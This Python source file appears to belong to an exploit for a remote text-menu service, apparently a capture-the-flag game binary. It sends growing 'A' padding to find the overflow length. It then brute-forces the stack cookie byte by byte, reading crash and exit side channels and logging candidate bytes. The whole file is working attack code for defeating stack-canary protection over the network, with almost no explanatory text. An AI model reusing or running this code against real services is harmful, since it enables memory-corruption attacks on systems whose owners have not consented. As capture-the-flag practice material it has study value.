from request import *
from globs import *

import binascii


def index_correspondance(index):
    if Glob.correspondances.get(index) is not None:
        return Glob.correspondances[index]
    else:
        m = Request.get_answer(index)
        exited = m.count('Bye!')
        if exited == 0:
            for i in m:
                if re.search('Enter your choice',i) is not None:
                    exited += 1
            if exited <= 1:
                exited = 0
                for i in m:
                    if re.search('I play',i) is not None:
                        exited += 1
                if exited <= 1:
                    exited = 0
        if exited == 0:
            Glob.correspondances[index] = 0
        else:
            Glob.correspondances[index] = 0
            for i in m:
                if re.search('Enter your choice', i) is not None or re.search('I play',i) is not None or re.search('Bye!',i) is not None:
                    Glob.correspondances[index] += 1
            l = len(m)
            if Glob.meta.get(Glob.correspondances[index]) is None:
                Glob.meta[Glob.correspondances[index]] = l
            if l != Glob.meta[Glob.correspondances[index]]:
                print("Warning : length of result is not the same as in Glob.meta :")
                print(str(l)+" whereas commonly for "+str(Glob.correspondances[index])+" it's "+str(Glob.meta[Glob.correspondances[index]]))
        return Glob.correspondances[index]

def find_length():
    garbage_len = -1
    for i in range(2,60):
        tmp = Request(Glob.host, Glob.PORT).send_receive('A'*i)
        index = tmp>>2
        if index_correspondance(index) == 0 and garbage_len<0:
            garbage_len = i-1

    if garbage_len<0:
        print("[-] No vulnerable length found, exiting")
        exit()

    return garbage_len

def leak_from_position(begin, end, prefix = '', stop_at_first_found = False, mask = None, targets = [1,2,3]):
    possibilities = open('cookie_possibilities','w')
    p1 = []
    p2 = []
    leaked = {}
    leaked_time = {}
    correct = {}
    cookie = ''

    index_allowed = []
    for i in range(256):
        if i!=0 and i!=10:
            index_allowed.append(i)
    index_allowed.append(0)
    index_allowed.append(10)

    if prefix == '':
        prefix = 'A'*begin
    for j in range(begin, end):
        if mask is not None and mask.get(j-begin) is not None and mask[j-begin]:
            cookie += '\x01'
            p1.append(255)
            p2.append(0)
        else:
            found = False
            leaked[j] = []
            leaked_time[j] = []
            correct[j] = []
            i = 0
            while (not found or not stop_at_first_found) and i<256:
                req = Request(Glob.host, Glob.PORT)
                tmp = req.send_receive(prefix+cookie+chr(index_allowed[i]))
                index = tmp>>2
                exited = (tmp>>1)&1

                if index in targets:
                    found = True
                    correct[j].append(chr(index_allowed[i]))
                if index_correspondance(index)>0:
                    leaked[j].append(chr(index_allowed[i]))
                if exited == 0:
                    leaked_time[j].append(chr(index_allowed[i]))

                if not found or not stop_at_first_found:
                    i += 1
                    time.sleep(0.1)

            if len(leaked[j]) == 0:
                print("[!] Ouch no dump has been made ...")
                cookie += '?'
            else:
                print("[.] Found part of cookie with "+str(len(leaked[j]))+" choices and "+str(len(leaked_time[j]))+" time leaked")
                if len(leaked[j])<10 and len(leaked[j])>1:
                    print(j)
                    print(leaked[j])
                    if len(leaked_time[j])>=1:
                        print(leaked_time[j])
                print("[.] But correct are "+str(len(correct[j]))+" :")
                print(correct[j])
                if len(leaked[j])>253:
                    p1.append(255)
                else:
                    a = len(leaked[j])
                    if '\x00' in leaked[j]:
                        a -= 1
                    if '\n' in leaked[j]:
                        a -= 1
                    p1.append(a)
                p2.append(len(leaked_time[j]))
                if not stop_at_first_found:
                    if correct[j][0] == '\x00' and len(correct[j])>1:
                        if correct[j][1] == '\n' and len(correct[j])>2:
                            cookie += correct[j][2]
                        elif correct[j][1] == '\n':
                            cookie += '\x00'
                        else:
                            cookie += correct[j][1]
                    elif correct[j][0] == '\n' and len(correct[j])>1:
                        cookie += correct[j][1]
                    else:
                        cookie += correct[j][0]
                else:
                    cookie += chr(index_allowed[i])

        print("[.] Current cookie = "+binascii.hexlify(cookie))

    for i in p1:
        t = str(i)
        possibilities.write(t+' '*(4-len(t)))
    possibilities.write('\n')
    for i in p2:
        t = str(i)
        possibilities.write(t+' '*(4-len(t)))

    return cookie, leaked, leaked_time

def leak_cookie(prefix, n_bytes_to_leak, target=3):
    t = []
    tmp = Request(Glob.host, Glob.PORT).send_receive(prefix)>>2
    t.append(tmp)
    while len(t) < target:
        tmp = Request(Glob.host, Glob.PORT).send_receive(prefix)>>2
        if tmp not in t:
            t.append(tmp)

    return leak_from_position(len(prefix), len(prefix)+n_bytes_to_leak, prefix, True, {4:True,5:True,6:True,7:True}, t)[0]
